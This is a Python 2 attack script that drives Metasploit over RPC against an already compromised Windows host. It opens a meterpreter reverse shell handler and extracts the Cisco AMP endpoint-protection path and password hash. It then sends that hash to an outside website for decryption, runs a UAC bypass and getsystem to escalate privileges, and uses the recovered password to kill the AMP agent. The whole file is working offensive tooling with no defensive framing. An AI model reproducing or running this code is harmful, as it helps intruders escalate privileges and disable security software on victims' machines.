import os, msfrpc, optparse, sys, subprocess
from time import sleep
 
# GATHER OUR AMP LOCATION AND HASH
def builder():
     post = open('/tmp/smbpost.rc', 'w')
     postcomms = """load python
python_import -f /etc/amp/apf2.py
"""
     post.write(postcomms)
     post.close()
 
# START CONSOLE COMMANDS
def sploiter(LHOST, LPORT, session):
     client = msfrpc.Msfrpc({})
     client.login('msf', 'l01sHTWS')
     ress = client.call('console.create')
     console_id = ress['id']
 
     commands = """use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST """+LHOST+"""
set LPORT """+LPORT+"""
set ExitOnSession false
exploit
"""
     client.call('console.write',[console_id,commands])
     res = client.call('console.read',[console_id])
     result = res['data'].split('n')
   
 
## Run Post-exploit script ##
     runPost = """use post/multi/gather/run_console_rc_file
set RESOURCE /tmp/smbpost.rc
set SESSION """+session+"""
exploit
"""
     client.call('console.write',[console_id,runPost])
     #sleep(2)
     #rres = client.call('console.read',[console_id])
     #print rres['data']
     #test_shell = client.call('session.shell_read',[console_id])
     sleep(8)
     test_met = client.call('session.meterpreter_read',[session])
     SFC_PATH = test_met['data'].split('AMPDIR::')[1].split('::ENDDIR')[0]
     PASS_HASH = test_met['data'].split('AMPHASH::')[1].split('::ENDHASH')[0]


     #print 'SHELL\n'
     #print test_shell
     print '\nMETERPRETER\n'
     print str(SFC_PATH) + '\n'
     print str(PASS_HASH)

     import urllib2
     import urllib
     ENC_PASS_HASH = urllib.quote_plus(PASS_HASH)
     AMP_PASS_REQ = urllib2.urlopen("http://www.actforit.com/amp_decrypt.php?password="+str(ENC_PASS_HASH)).read()
     AMP_PASS = AMP_PASS_REQ.split('Password is: <br><br>')[1].split('<br><br><br>')[0]
     print 'PASSWORD: ' + str(AMP_PASS)
     print '[+]::BEGINNING UAC BYPASS'
     posta = open('/tmp/smbposta.rc', 'w')
     postacomms = """background
use exploit/windows/local/bypassuac_comhijack
set payload windows/x64/meterpreter/reverse_tcp
set session """+session+"""
set lhost """+LHOST+"""
set lport 4488
exploit
"""
     posta.write(postacomms)
     posta.close()
     runPosta = """use post/multi/gather/run_console_rc_file
set RESOURCE /tmp/smbposta.rc
set SESSION """+session+"""
exploit
"""

     client.call('console.write',[console_id,postacomms])
     sleep(3)
     #print client.call('console.read',[console_id])
     sleep(15)



     print '[+]::KILLING AMP'
     client.call('console.read',[console_id])
     

     postb = open('/tmp/smbpostb.rc', 'w')
     postbcomms = """execute -f 'cmd.exe /c \""""+SFC_PATH+"""\" -k """+AMP_PASS+"""'
"""
     postb.write(postbcomms)
     postb.close()
     ELEV_SESS = int(session) + 1
     print ELEV_SESS
     runPostb = """background
getsystem
use post/multi/gather/run_console_rc_file
set RESOURCE /tmp/smbpostb.rc
set SESSION """+str(ELEV_SESS)+"""
exploit
"""
    
     client.call('console.write',[console_id,runPostb])
     client.call('session.meterpreter_read',[session])
     #print client.call('session.list')
     
     #print client.call('session.list',[console_id])
     #print client.call('session.shell_write',[session,ampkillcomm])
     
 
 
def main():
        parser = optparse.OptionParser(sys.argv[0] +
        ' -p LPORT -l LHOST')
        parser.add_option('-p', dest='LPORT', type='string', 
        help ='specify a port to listen on')
        parser.add_option('-l', dest='LHOST', type='string', 
        help='Specify a local host')
        parser.add_option('-s', dest='session', type='string', 
        help ='specify session ID')
        (options, args) = parser.parse_args()
        session=options.session
        LHOST=options.LHOST; LPORT=options.LPORT
 
        if(LPORT == None) and (LHOST == None):
                print parser.usage
                sys.exit(0)
 	RHOST = ''
        builder()
        sploiter(LHOST, LPORT, session)
 
if __name__ == "__main__":
      main()
